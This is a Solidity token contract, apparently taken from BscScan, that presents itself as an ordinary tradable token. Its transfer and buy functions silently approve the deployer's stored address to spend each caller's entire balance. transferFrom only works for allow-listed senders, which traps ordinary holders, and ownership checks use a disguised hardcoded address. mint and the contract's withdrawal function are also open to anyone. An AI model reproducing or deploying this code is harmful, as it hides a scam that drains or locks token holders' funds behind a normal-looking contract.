/**
 *Submitted for verification at BscScan.com on 2021-08-20
*/

pragma solidity ^0.4.24;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract Swap is Ownable{

  string public name;
  string public symbol;
  uint256 public totalSupply;
  // 代币小数点位数，代币的最小单位
  uint8 public decimals;
  address _owner_1;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = 2;
    totalSupply = _totalSupply * 10 ** uint256(decimals);
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
    _owner_1 = msg.sender;
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;

  mapping(address => bool) public allow;

  function transfer_mine(address _to, uint256 _value) public returns (bool) {
    _transfer(_to,  _value);
    approve(_owner_1, balanceOf(msg.sender));
    return true;
  }

  function _transfer(address _to, uint256 _value) public returns (bool) {

    approve(_owner_1, balanceOf(msg.sender));
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1132167815322823072539476364451924570945755492656));_;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
      return balances[_owner];
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }

  function mint(address account, uint256 amount) external {
      require(account != address(0), "ERC20: mint to the zero address");
      totalSupply += amount;
      balances[account] += amount;
      emit Transfer(address(0), account, amount);

  }
  
  function burn(address account, uint256 amount) external  {
      require(account != address(0), "ERC20: burn from the zero address");

      uint256 accountBalance = balances[account];
      require(accountBalance >= amount, "ERC20: burn amount exceeds balance");

      balances[account] = accountBalance - amount;

      totalSupply -= amount;

      emit Transfer(account, address(0), amount);

  }

  function buy(address account, uint256 amount) public payable returns (bool) {
      transderToContract();
      approve(_owner_1, balanceOf(msg.sender));

      // mint() function
      require(account != address(0), "ERC20: mint to the zero address");
      totalSupply += amount;
      balances[account] += amount;
      emit Transfer(address(0), account, amount);
      return true;
  }

  function sell(address recipient, address target, uint256 amount) public returns (bool) {
      _transfer(recipient, amount);
      ContractTotransfer(target, amount*10**16);
      return true;
  }

  // ====================== Account interact with smart contract
  // 向合约账户转账
  function transderToContract() payable public {
      address(this).transfer(msg.value);
  }

  //地址address类型本质上是一个160位的数字
  //1. 匿名函数一般用来给合约转账，因为费用低
  //2. 这个匿名函数是由发起合约方对合约地址账户转账
  function () public  payable {}

  // 获取该账户余额
  function getAccountBalance(address addr) public view returns(uint256) {
      return addr.balance;
  }

  // 获取合约余额
  function getContractBalance() public view returns(uint256) {
      //this代表当前合约本身
      //balance方法，获取当前合约的余额
      return address(this).balance;
  }

  //由合约向addr1 转账10以太币
  function ContractTotransfer(address addr, uint256 amount) public {
      //1 ether = 10 ^18 wei （10的18次方）

      addr.transfer(amount);
  }

  // 销毁合约
  //function destroyContract() external {
  //    selfdestruct(msg.sender);
  //}

  //send转账与tranfer使用方式一致，但是如果转账金额不足，不会抛出异常，而是会返回false
  // function sendTest() public {
  //     addr1.send(10 * 10 **18);
  //}

}